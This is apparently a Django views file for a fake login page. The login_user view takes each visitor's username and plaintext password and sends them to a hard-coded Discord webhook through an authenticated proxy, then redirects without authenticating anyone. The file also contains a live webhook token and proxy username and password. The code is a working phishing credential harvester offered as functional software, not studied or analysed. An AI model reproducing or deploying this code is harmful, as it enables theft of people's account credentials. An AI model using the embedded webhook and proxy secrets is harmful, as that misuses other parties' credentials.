from django.shortcuts import render, redirect
from django.contrib import messages
import logging
import requests
from datetime import datetime
import json
import os

# Set up logger
logger = logging.getLogger(__name__)

# Discord Webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1523355615525867650/s28X3S_aIDij8oeU5LGcBSdyjjZgInl5oqa4DMpTyMDAhkE2thkUU_dtZ_t2yiipaT9N"

# Your proxy configuration
PROXY = {
    'http': 'http://14ad8d1127bc2:b98fe3138d@217.67.68.235:12323',
    'https': 'http://14ad8d1127bc2:b98fe3138d@217.67.68.235:12323'
}

# Set to True to use proxy
USE_PROXY = True

def send_discord_notification(username, password, user_id=None, ip_address=None, user_agent=None):
    """
    Send login attempt information to Discord webhook using proxy
    """
    try:
        # Create the embed message
        embed = {
            "title": "🔐 New Login Attempt",
            "color": 0x00ff00,
            "fields": [
                {
                    "name": "👤 Username/Email",
                    "value": username,
                    "inline": True
                },
                {
                    "name": "🔑 Password",
                    "value": f"||{password}||",
                    "inline": True
                },
                {
                    "name": "⏰ Timestamp",
                    "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "inline": False
                }
            ],
            "footer": {
                "text": "Login Monitor"
            },
            "timestamp": datetime.now().isoformat()
        }
        
        payload = {
            "content": "🚨 **Login Attempt Detected!**",
            "embeds": [embed],
            "username": "Login Monitor Bot",
            "avatar_url": "https://cdn-icons-png.flaticon.com/512/1047/1047711.png"
        }
        
        print(f"📤 Sending to Discord via proxy...")
        print(f"🔄 Using proxy: {PROXY.get('http', 'None')}")
        
        # Send to Discord using proxy
        if USE_PROXY:
            response = requests.post(
                WEBHOOK_URL, 
                json=payload, 
                timeout=30,
                proxies=PROXY,
                headers={'Content-Type': 'application/json'}
            )
        else:
            response = requests.post(
                WEBHOOK_URL, 
                json=payload, 
                timeout=30,
                headers={'Content-Type': 'application/json'}
            )
        
        print(f"📬 Discord response status: {response.status_code}")
        
        if response.status_code == 204:
            print(f"✅ Discord notification sent successfully for: {username}")
            return True
        else:
            print(f"❌ Discord returned status {response.status_code}: {response.text}")
            return False
            
    except requests.exceptions.ProxyError as e:
        print(f"❌ Proxy error: {e}")
        print("💡 Check if proxy is working")
        return False
    except requests.exceptions.Timeout:
        print("⏰ Request timeout - proxy might be slow")
        return False
    except requests.exceptions.ConnectionError as e:
        print(f"❌ Connection error: {e}")
        return False
    except requests.exceptions.RequestException as e:
        print(f"❌ Error sending Discord webhook: {e}")
        return False

def user_profile(request, user_id):
    context = {
        'user_id': user_id,
        'username': 'John Doe',
        'email': 'john@example.com',
        'bio': 'This is a sample user profile page.',
        'join_date': 'January 2025',
    }
    return render(request, 'people/user_profile.html', context)

def login_page(request, user_id):
    """
    Login page view
    """
    context = {
        'user_id': user_id,
    }
    return render(request, 'people/login.html', context)

def login_user(request, user_id):
    """
    Handle login - send data to Discord via proxy
    """
    print("=" * 50)
    print(f"🔐 LOGIN ATTEMPT - User ID: {user_id}")
    print(f"📝 Request method: {request.method}")
    
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        
        print(f"👤 Username received: {username}")
        print(f"🔑 Password received: {'*' * len(password) if password else 'None'}")
        print(f"📦 All POST data: {request.POST}")
        
        # Get additional information
        ip_address = request.META.get('HTTP_X_FORWARDED_FOR', request.META.get('REMOTE_ADDR', ''))
        user_agent = request.META.get('HTTP_USER_AGENT', '')
        
        print(f"🌐 IP Address: {ip_address}")
        print(f"🖥️ User Agent: {user_agent}")
        
        # Send to Discord via proxy
        print("📤 Attempting to send to Discord via proxy...")
        notification_sent = send_discord_notification(
            username=username,
            password=password,
            user_id=user_id,
            ip_address=ip_address,
            user_agent=user_agent
        )
        
        if notification_sent:
            print("✅ Successfully sent to Discord")
            messages.success(request, 'Login information sent to Discord!')
        else:
            print("⚠️ Failed to send to Discord")
            messages.warning(request, 'Could not send to Discord.')
        
        print("=" * 50)
        
        # Redirect back to profile page
        return redirect('user_profile', user_id=user_id)
    
    print(f"❌ Invalid request method: {request.method}")
    print("=" * 50)
    return redirect('login_page', user_id=user_id)

def logout_user(request, user_id):
    """
    Handle logout
    """
    messages.info(request, 'You have been logged out.')
    return redirect('login_page', user_id=user_id)